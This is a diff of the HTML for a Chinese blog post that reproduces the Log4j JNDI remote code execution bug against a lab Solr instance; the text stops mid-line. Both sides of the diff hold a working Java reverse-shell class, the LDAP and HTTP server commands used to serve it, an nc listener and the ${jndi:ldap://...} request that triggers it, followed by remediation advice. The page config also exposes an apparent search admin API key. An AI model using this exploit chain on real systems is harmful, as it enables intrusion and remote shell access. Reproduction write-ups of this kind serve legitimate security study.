@@ -1,6 +1,6 @@
 
 <!DOCTYPE html>
-<html>
+<html lang="zh-CN">
 <head>
   <meta charset="UTF-8"/>
   <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
@@ -10,13 +10,30 @@
 
   <title>Log4j CVE-2021-45046 复现 | Pa55w0rd &#39;s Blog</title>
 
-  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="漏洞描述Apache Log4j2是一款优秀的Java日志框架。2021年11月24日，阿里云安全团队向Apache官方报告了Apache Log4j2远程代码执行漏洞。由于Apache Log4j2某些功能存在递归解析功能，攻击者可直接构造恶意请求，触发远程代码执行漏洞。漏洞利用无需特殊配置，经阿里云安全团队验证，Apache Struts2、Apache Solr、Apache Druid、A">
+  
+
+  <link rel="canonical" href="http://www.pa55w0rd.online/log4j/">
+
+
+  <meta name="keywords" content="应急响应">
+
+
+
+
+  <meta name="applicable-device" content="pc,mobile">
+  <meta name="renderer" content="webkit">
+
+
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","headline":"Log4j CVE-2021-45046 复现","description":"Apache Log4j2是一款优秀的Java日志框架。2021年11月24日，阿里云安全团队向Apache官方报告了Apache Log4j2远程代码执行漏洞。由于Apache Log4j2某些功能存在递归解析功能，攻击者可直接构造恶意请...","url":"http://www.pa55w0rd.online/log4j/","datePublished":"2021-12-17T08:33:07.000Z","dateModified":"2026-03-24T07:59:41.280Z","author":{"@type":"Person","name":"Pa55w0rd"},"publisher":{"@type":"Organization","name":"Pa55w0rd 's Blog","url":"http://www.pa55w0rd.online/","logo":{"@type":"ImageObject","url":"http://www.pa55w0rd.online/img/favicon.ico"}},"mainEntityOfPage":{"@type":"WebPage","@id":"http://www.pa55w0rd.online/log4j/"},"inLanguage":"zh-CN"}</script>
+
+
+  
+  <meta name="description" content="Apache Log4j2是一款优秀的Java日志框架。2021年11月24日，阿里云安全团队向Apache官方报告了Apache Log4j2远程代码执行漏洞。由于Apache Log4j2某些功能存在递归解析功能，攻击者可直接构造恶意请...">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Log4j CVE-2021-45046 复现">
-<meta property="og:url" content="http://www.pa55w0rd.online/log4j/index.html">
+<meta property="og:url" content="http://www.pa55w0rd.online/log4j/">
 <meta property="og:site_name" content="Pa55w0rd &#39;s Blog">
-<meta property="og:description" content="漏洞描述Apache Log4j2是一款优秀的Java日志框架。2021年11月24日，阿里云安全团队向Apache官方报告了Apache Log4j2远程代码执行漏洞。由于Apache Log4j2某些功能存在递归解析功能，攻击者可直接构造恶意请求，触发远程代码执行漏洞。漏洞利用无需特殊配置，经阿里云安全团队验证，Apache Struts2、Apache Solr、Apache Druid、A">
+<meta property="og:description" content="Apache Log4j2是一款优秀的Java日志框架。2021年11月24日，阿里云安全团队向Apache官方报告了Apache Log4j2远程代码执行漏洞。由于Apache Log4j2某些功能存在递归解析功能，攻击者可直接构造恶意请...">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://pic.rmb.bdstatic.com/bjh/bd2dcbe7957c7bf340c04dcaa20a749d.png">
 <meta property="og:image" content="https://pic.rmb.bdstatic.com/bjh/2fed9b14b1f5b797d6187aebb1eac0c4.png">
@@ -25,7 +42,7 @@
 <meta property="og:image" content="https://pic.rmb.bdstatic.com/bjh/cfffa3ddd7d59e6696113a8b3d857e2d.png">
 <meta property="og:image" content="https://pic.rmb.bdstatic.com/bjh/179763afe5257feb006fce33d55c4568.png">
 <meta property="article:published_time" content="2021-12-17T08:33:07.000Z">
-<meta property="article:modified_time" content="2021-12-17T10:24:59.682Z">
+<meta property="article:modified_time" content="2026-03-24T07:59:41.280Z">
 <meta property="article:author" content="Pa55w0rd">
 <meta property="article:tag" content="应急响应">
 <meta name="twitter:card" content="summary">
@@ -48,7 +65,7 @@
 
 
   
-    <link rel="alternative" href="/atom.xml" title="Pa55w0rd &#39;s Blog" type="application/atom+xml">
+    <link rel="alternate" href="/atom.xml" title="Pa55w0rd &#39;s Blog" type="application/atom+xml">
   
 
 
@@ -60,25 +77,36 @@
   
 <link rel="stylesheet" href="/css/style.css">
 
+  
+  <!-- 自定义目录样式 -->
+  
+<link rel="stylesheet" href="/assets/css/custom-toc.css">
+
+  
   <!-- <link href="/css/show.ua.css" rel="stylesheet" type="text/css" > -->
-  <link href="http://fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
-  <!--[if lt IE 9]><script src="//cdn.bootcss.com/html5shiv/r29/html5.min.js"></script><![endif]-->
+  <link rel="preconnect" href="https://fonts.googleapis.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css?family=Source+Code+Pro:400,700&display=swap" rel="stylesheet">
+  <!--[if lt IE 9]><script src="https://cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv.min.js"></script><![endif]-->
   <!-- <link href="/vendors/bootstrap/css/bootstrap.min.css" rel="stylesheet" type="text/css" /> -->
 
   <link href="/vendors/font-awesome/css/font-awesome.min.css" rel="stylesheet" type="text/css" />
 
-  <script src="/js/ua-parser.min.js" type="text/javascript"></script>
-  <script src="/js/jquery.js" type="text/javascript"></script>
-  <script src="/js/jquery.min.js" type="text/javascript"></script>
-  <script src="/js/scrollReveal.js" type="text/javascript"></script>
-  <script src="http://cdn.bootcss.com/instantsearch.js/1.5.1/instantsearch.js"></script>
-  <script src="/js/algolia-search.js" type="text/javascript"></script>
-  <!-- <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
-  <script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script> -->
-  <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
-  <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
-  <script src="https://cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.js"></script>
   
+  <script>
+   var CONFIG = {
+    root: '/',
+    algolia: {
+          applicationID: "W1CAX1W2FZ",
+          apiKey: "0a71809a146dcea950631aea9ef44f9c",
+          adminApiKey: "432573b0a0ab3afd374bd04484251a9b",
+          indexName: "Blog",
+          hits: {"per_page":10},
+          labels: {"input_placeholder":"搜索...","hits_empty":"未发现与 「${query}」相关的内容","hits_stats":"${hits} 条相关条目，使用了 ${time} 毫秒"}
+        }
+  };
+  </script>
+  
+
   
 <!-- Google Analytics -->
 <script type="text/javascript">
@@ -98,31 +126,6 @@ ga('send', 'pageview');
 
 
 
-
-  
-  
-  <!-- 
-  
-  
-  
-  
-  
-   -->
-
-
-  <script>
-   var CONFIG = {
-    root: '/',
-    algolia: {
-          applicationID: "W1CAX1W2FZ",
-          apiKey: "0a71809a146dcea950631aea9ef44f9c",
-          adminApiKey: "432573b0a0ab3afd374bd04484251a9b",
-          indexName: "Blog",
-          hits: {"per_page":10},
-          labels: {"input_placeholder":"搜索...","hits_empty":"未发现与 「${query}」相关的内容","hits_stats":"${hits} 条相关条目，使用了 ${time} 毫秒"}
-        }
-  };
-  </script>
 <!--
 <script>
     (function(){
@@ -135,11 +138,11 @@ ga('send', 'pageview');
     })();
   </script>
 -->
-<meta name="generator" content="Hexo 5.4.0"></head>
+<meta name="generator" content="Hexo 7.3.0"></head>
 
 
 
-<body>
+<body data-toc="on">
 <div id="container">
   <div id="wrap">
     <header id="header">
@@ -197,21 +200,37 @@ ga('send', 'pageview');
 </header>
 
     <div class="outer">
-      <section id="main"><article   id="post-log4j" class="article article-type-post" itemscope itemprop="blogPost">
-  <div data-scroll-reveal="enter top and over 0.7s"  class="article-meta">
-    <a  href="/log4j/" class="article-date">
-  <i class="fa fa-calendar"></i>
-  <time  datetime="2021-12-17T08:33:07.000Z" itemprop="datePublished">2021-12-17</time>
-</a>
+      <section id="main"><article id="post-log4j" class="article article-type-post" itemscope itemtype="https://schema.org/BlogPosting">
+  <header data-scroll-reveal="enter top and over 0.7s" class="article-meta">
+    <div class="article-meta-primary">
+      
+<span class="article-date">
+  <i class="fa fa-calendar" aria-hidden="true"></i>
+  <time datetime="2021-12-17T08:33:07.000Z" itemprop="datePublished">2021-12-17</time>
+</span>
 
-    
+
+      
   <div class="article-category">
     <a class="article-category-link" href="/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/">应急响应</a>
   </div>
 
 
-  </div>
-  <div class="article-inner"  >
+    </div>
+    
+    <div class="article-reading-aside" aria-label="字数与阅读时长">
+      <i class="fa fa-file-text-o" aria-hidden="true"></i>
+      <span class="article-wordcount">约 903 字</span>
+      <span class="article-reading-time">约 3 分钟读完</span>
+    </div>
+    
+    
+    <span class="article-meta-sronly">
+      <time datetime="2026-03-24T07:59:41.280Z" itemprop="dateModified">2026-03-24</time>
+    </span>
+    
+  </header>
+  <div class="article-inner">
     
     
 
@@ -228,39 +247,6 @@ ga('send', 'pageview');
 
       </header>
     
-    <!-- <span title="{{ __('post.wordcount') }}">
-      字数统计：{{ wordcount(post.content) }} 字
-     </span>
-     <span title="{{ __('post.min2read') }}">
-      阅读时长：预计{{ min2read(post.content) }} 分钟
-    </span> -->
-    <!-- 目录内容 -->
-
-  <p class="show-toc-btn" id="show-toc-btn" onclick="showToc();" style="display:none">
-        <span class="btn-bg"></span>
-        <span class="btn-text">文章导航</span>
-        </p>
-<div id="toc-article" class="toc-article">
-    <span id="toc-close" class="toc-close" title="隐藏导航" onclick="showBtn();">×</span>
-  <strong class="toc-title">文章目录</strong>
-         <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0"><span class="toc-number">1.</span> <span class="toc-text">漏洞描述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%BB%91%E7%9B%92%E6%A3%80%E6%B5%8B%E5%B7%A5%E5%85%B7"><span class="toc-number">2.</span> <span class="toc-text">黑盒检测工具</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA"><span class="toc-number">3.</span> <span class="toc-text">靶场搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B"><span class="toc-number">4.</span> <span class="toc-text">漏洞检测</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">5.</span> <span class="toc-text">漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%81%B6%E6%84%8F%E7%B1%BB"><span class="toc-number">5.1.</span> <span class="toc-text">恶意类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%B4%E6%8E%A5%E4%BD%BF%E7%94%A8python%E5%90%AF%E5%8A%A8%E6%9C%8D%E5%8A%A1"><span class="toc-number">5.2.</span> <span class="toc-text">直接使用python启动服务</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%AF%E5%8A%A8%E6%81%B6%E6%84%8Fldap%E6%9C%8D%E5%8A%A1%E5%99%A8"><span class="toc-number">5.3.</span> <span class="toc-text">启动恶意ldap服务器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#nc-%E7%9B%91%E5%90%AC%E5%8F%8D%E8%BF%9E%E7%AB%AF%E5%8F%A3"><span class="toc-number">5.4.</span> <span class="toc-text">nc 监听反连端口</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A6%E5%8F%91%E6%BC%8F%E6%B4%9E"><span class="toc-number">5.5.</span> <span class="toc-text">触发漏洞</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE"><span class="toc-number">6.</span> <span class="toc-text">修复建议</span></a></li></ol>
-       </div>
- <script type="text/javascript">
-function showToc(){
-  var toc_article = document.getElementById("toc-article");
-  var show_toc_btn = document.getElementById("show-toc-btn");
-  toc_article.setAttribute("style","display:block");
-  show_toc_btn.setAttribute("style","display:none");
-  };
-function showBtn(){
-  var toc_article = document.getElementById("toc-article");
-  var show_toc_btn = document.getElementById("show-toc-btn");
-  toc_article.setAttribute("style","display:none");
-  show_toc_btn.setAttribute("style","display:block");
-  };
- </script>
-    		
-<!-- 目录内容结束 -->
     <div class="article-entry" itemprop="articleBody">
       
         
@@ -281,14 +267,14 @@ function showBtn(){
 <p>这里确认indexInfo参数触发漏洞</p>
 <h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>参考fastjson漏洞利用，利用恶意ldap服务器进行jndi注入，加载远程恶意类，造成任意代码执行</p>
 <h3 id="恶意类"><a href="#恶意类" class="headerlink" title="恶意类"></a>恶意类</h3><p>这里先写一个恶意类 Exploit.java，并编译为class文件</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.OutputStream;</span><br><span class="line"><span class="keyword">import</span> java.net.Socket;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exploit</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="title">Exploit</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    String host=<span class="string">&quot;x.x.x.x&quot;</span>;  <span class="comment">//修改为反弹服务器</span></span><br><span class="line">    <span class="keyword">int</span> port=x;  <span class="comment">// 修改为反连端口</span></span><br><span class="line">    String cmd=<span class="string">&quot;/bin/sh&quot;</span>;</span><br><span class="line">    Process p=<span class="keyword">new</span> ProcessBuilder(cmd).redirectErrorStream(<span class="keyword">true</span>).start();</span><br><span class="line">    Socket s=<span class="keyword">new</span> Socket(host,port);</span><br><span class="line">    InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();</span><br><span class="line">    OutputStream po=p.getOutputStream(),so=s.getOutputStream();</span><br><span class="line">    <span class="keyword">while</span>(!s.isClosed()) &#123;</span><br><span class="line">      <span class="keyword">while</span>(pi.available()&gt;<span class="number">0</span>)</span><br><span class="line">        so.write(pi.read());</span><br><span class="line">      <span class="keyword">while</span>(pe.available()&gt;<span class="number">0</span>)</span><br><span class="line">        so.write(pe.read());</span><br><span class="line">      <span class="keyword">while</span>(si.available()&gt;<span class="number">0</span>)</span><br><span class="line">        po.write(si.read());</span><br><span class="line">      so.flush();</span><br><span class="line">      po.flush();</span><br><span class="line">      Thread.sleep(<span class="number">50</span>);</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        p.exitValue();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    p.destroy();</span><br><span class="line">    s.close();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h3 id="直接使用python启动服务"><a href="#直接使用python启动服务" class="headerlink" title="直接使用python启动服务"></a>直接使用python启动服务</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPServer <span class="number">80</span>  <span class="regexp">//</span>xxx为web端口</span><br></pre></td></tr></table></figure>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.OutputStream;</span><br><span class="line"><span class="keyword">import</span> java.net.Socket;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Exploit</span> &#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="title function_">Exploit</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    String host=<span class="string">&quot;x.x.x.x&quot;</span>;  <span class="comment">//修改为反弹服务器</span></span><br><span class="line">    <span class="type">int</span> port=x;  <span class="comment">// 修改为反连端口</span></span><br><span class="line">    String cmd=<span class="string">&quot;/bin/sh&quot;</span>;</span><br><span class="line">    Process p=<span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(cmd).redirectErrorStream(<span class="literal">true</span>).start();</span><br><span class="line">    Socket s=<span class="keyword">new</span> <span class="title class_">Socket</span>(host,port);</span><br><span class="line">    InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();</span><br><span class="line">    OutputStream po=p.getOutputStream(),so=s.getOutputStream();</span><br><span class="line">    <span class="keyword">while</span>(!s.isClosed()) &#123;</span><br><span class="line">      <span class="keyword">while</span>(pi.available()&gt;<span class="number">0</span>)</span><br><span class="line">        so.write(pi.read());</span><br><span class="line">      <span class="keyword">while</span>(pe.available()&gt;<span class="number">0</span>)</span><br><span class="line">        so.write(pe.read());</span><br><span class="line">      <span class="keyword">while</span>(si.available()&gt;<span class="number">0</span>)</span><br><span class="line">        po.write(si.read());</span><br><span class="line">      so.flush();</span><br><span class="line">      po.flush();</span><br><span class="line">      Thread.sleep(<span class="number">50</span>);</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        p.exitValue();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    p.destroy();</span><br><span class="line">    s.close();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="直接使用python启动服务"><a href="#直接使用python启动服务" class="headerlink" title="直接使用python启动服务"></a>直接使用python启动服务</h3><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">python</span> -m SimpleHTTPServer <span class="number">80</span>  <span class="comment">//xxx为web端口</span></span><br></pre></td></tr></table></figure>
 
 <h3 id="启动恶意ldap服务器"><a href="#启动恶意ldap服务器" class="headerlink" title="启动恶意ldap服务器"></a>启动恶意ldap服务器</h3><p>之前复现fastjson的直接拿过来用</p>
 <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">java</span> -cp marshalsec-<span class="number">0</span>.<span class="number">0</span>.<span class="number">3</span>-SNAPSHOT-<span class="literal">all</span>.jar marshalsec.jndi.LDAPRefServer http://x.x.x.x/#Exploit xxx //xxx为ldap端口</span><br></pre></td></tr></table></figure>
-<h3 id="nc-监听反连端口"><a href="#nc-监听反连端口" class="headerlink" title="nc 监听反连端口"></a>nc 监听反连端口</h3><p>nc -lvvp x //x 为恶意类指定的反连端口</p>
+<h3 id="nc-监听反连端口"><a href="#nc-监听反连端口" class="headerlink" title="nc 监听反连端口"></a>nc 监听反连端口</h3><p>nc -lvvp x &#x2F;&#x2F;x 为恶意类指定的反连端口</p>
 <h3 id="触发漏洞"><a href="#触发漏洞" class="headerlink" title="触发漏洞"></a>触发漏洞</h3><p>发送请求</p>
-<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">GET</span> /solr/admin/cores?_=<span class="number">1639731882458</span>&amp;wt=json&amp;indexInfo=<span class="variable">$&#123;jndi:ldap://x.x.x.x:xxx/#Exploit&#125;</span> HTTP/<span class="number">1</span>.<span class="number">1</span></span><br><span class="line"><span class="attribute">Host</span>: <span class="number">192.168.64.128:8983</span></span><br><span class="line"><span class="attribute">X</span>-Requested-With: XMLHttpRequest</span><br><span class="line"><span class="attribute">Referer</span>: http://<span class="number">192.168.64.128:8983</span>/solr/</span><br><span class="line"><span class="attribute">Cookie</span>: JSESSIONID=<span class="number">066</span>F<span class="number">1</span>A<span class="number">7579</span>CF<span class="number">0</span>FC<span class="number">0</span>C<span class="number">94</span>C<span class="number">097160</span>C<span class="number">692</span>F<span class="number">6</span></span><br><span class="line"><span class="attribute">Connection</span>: close</span><br></pre></td></tr></table></figure>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/solr/admin/cores?_=1639731882458&amp;wt=json&amp;indexInfo=$&#123;jndi:ldap://x.x.x.x:xxx/#Exploit&#125;</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.64.128:8983</span><br><span class="line"><span class="attribute">X-Requested-With</span><span class="punctuation">: </span>XMLHttpRequest</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://192.168.64.128:8983/solr/</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>JSESSIONID=066F1A7579CF0FC0C94C097160C692F6</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br></pre></td></tr></table></figure>
 
 <p>查看ldap服务器响应</p>
 <p><img src="https://pic.rmb.bdstatic.com/bjh/268b35659c86937787fd5f490767e9b9.png" alt="image.png"></p>
@@ -296,7 +282,8 @@ function showBtn(){
 <p><img src="https://pic.rmb.bdstatic.com/bjh/cfffa3ddd7d59e6696113a8b3d857e2d.png" alt="image.png"></p>
 <p>查看nc监听，可以看到拿到shell了<br><img src="https://pic.rmb.bdstatic.com/bjh/179763afe5257feb006fce33d55c4568.png" alt="image.png"></p>
 <p>这里可以看到拿到shell了，这里吐槽一下某SRC，修复窗口都一周了，补丁没打完，SRC还不收漏洞，低内核版本的linux，可脏牛提权，直接忽略</p>
-<h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><p>升级log4j到 2.15.0-rc2以上/添加jvm参数 -Dlog4j2.formatMsgNoLookups=true/使用rasp防护/删除jndilookup都可以</p>
+<h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><p>升级log4j到 2.15.0-rc2以上&#x2F;添加jvm参数 -Dlog4j2.formatMsgNoLookups&#x3D;true&#x2F;使用rasp防护&#x2F;删除jndilookup都可以</p>
+<p> <a href="http://www.pa55w0rd.online/log4j/">http://www.pa55w0rd.online/log4j/</a> </p>
 
         
 <!--
@@ -320,14 +307,14 @@ function showBtn(){
 <p>这里确认indexInfo参数触发漏洞</p>
 <h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>参考fastjson漏洞利用，利用恶意ldap服务器进行jndi注入，加载远程恶意类，造成任意代码执行</p>
 <h3 id="恶意类"><a href="#恶意类" class="headerlink" title="恶意类"></a>恶意类</h3><p>这里先写一个恶意类 Exploit.java，并编译为class文件</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.OutputStream;</span><br><span class="line"><span class="keyword">import</span> java.net.Socket;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exploit</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="title">Exploit</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    String host=<span class="string">&quot;x.x.x.x&quot;</span>;  <span class="comment">//修改为反弹服务器</span></span><br><span class="line">    <span class="keyword">int</span> port=x;  <span class="comment">// 修改为反连端口</span></span><br><span class="line">    String cmd=<span class="string">&quot;/bin/sh&quot;</span>;</span><br><span class="line">    Process p=<span class="keyword">new</span> ProcessBuilder(cmd).redirectErrorStream(<span class="keyword">true</span>).start();</span><br><span class="line">    Socket s=<span class="keyword">new</span> Socket(host,port);</span><br><span class="line">    InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();</span><br><span class="line">    OutputStream po=p.getOutputStream(),so=s.getOutputStream();</span><br><span class="line">    <span class="keyword">while</span>(!s.isClosed()) &#123;</span><br><span class="line">      <span class="keyword">while</span>(pi.available()&gt;<span class="number">0</span>)</span><br><span class="line">        so.write(pi.read());</span><br><span class="line">      <span class="keyword">while</span>(pe.available()&gt;<span class="number">0</span>)</span><br><span class="line">        so.write(pe.read());</span><br><span class="line">      <span class="keyword">while</span>(si.available()&gt;<span class="number">0</span>)</span><br><span class="line">        po.write(si.read());</span><br><span class="line">      so.flush();</span><br><span class="line">      po.flush();</span><br><span class="line">      Thread.sleep(<span class="number">50</span>);</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        p.exitValue();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    p.destroy();</span><br><span class="line">    s.close();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h3 id="直接使用python启动服务"><a href="#直接使用python启动服务" class="headerlink" title="直接使用python启动服务"></a>直接使用python启动服务</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPServer <span class="number">80</span>  <span class="regexp">//</span>xxx为web端口</span><br></pre></td></tr></table></figure>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.OutputStream;</span><br><span class="line"><span class="keyword">import</span> java.net.Socket;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Exploit</span> &#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="title function_">Exploit</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    String host=<span class="string">&quot;x.x.x.x&quot;</span>;  <span class="comment">//修改为反弹服务器</span></span><br><span class="line">    <span class="type">int</span> port=x;  <span class="comment">// 修改为反连端口</span></span><br><span class="line">    String cmd=<span class="string">&quot;/bin/sh&quot;</span>;</span><br><span class="line">    Process p=<span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(cmd).redirectErrorStream(<span class="literal">true</span>).start();</span><br><span class="line">    Socket 